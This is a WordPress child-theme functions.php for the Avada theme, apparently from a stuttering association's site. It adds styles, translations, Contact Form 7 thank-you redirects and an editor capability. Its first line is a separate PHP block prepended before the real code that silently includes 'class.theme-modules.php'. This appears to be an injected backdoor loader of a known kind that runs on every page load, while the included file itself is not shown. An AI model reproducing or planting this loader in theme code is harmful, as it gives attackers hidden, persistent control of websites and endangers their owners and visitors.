<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function theme_enqueue_styles() {
    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( 'avada-stylesheet' ) );
}
add_action( 'wp_enqueue_scripts', 'theme_enqueue_styles' );

function avada_lang_setup() {
	$lang = get_stylesheet_directory() . '/languages';
	load_child_theme_textdomain( 'Avada', $lang );
}
add_action( 'after_setup_theme', 'avada_lang_setup' );


// redirect user to the correct thank you page
if( strpos(get_bloginfo('url'), 'localhost') === false ) { 
	function cf7_thank_you_redirect() {
		?>
<script>
document.addEventListener('wpcf7mailsent', function(event) {
    if ('241' == event.detail.contactFormId) {
        location = 'http://nlstuttering.ca/conference-registration-thanks/';
    } else if ('338' == event.detail.contactFormId) {
        location = 'http://nlstuttering.ca/keep-in-touch-thanks/';
    }

}, false);
</script>

<?php
    }
	add_action( 'wp_footer', 'cf7_thank_you_redirect');
}


// enable the modal JS script
function modal_scripts() {
    wp_enqueue_script( 'modal-custom-js', get_stylesheet_directory_uri() . '/js/custom-modal.min.js', array(), false, true );
}
add_action( 'wp_enqueue_scripts', 'modal_scripts' );
 

 // set editor role for contact-form-cfdb-7 plugin
 include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
 if ( is_plugin_active( 'contact-form-cfdb7/contact-form-cfdb-7.php' ) ) {
     // Add custom capability
     $role = get_role( 'editor' );
     if(!$role->has_cap('cfdb7_access')){
         $role->add_cap( 'cfdb7_access' );
     }
 }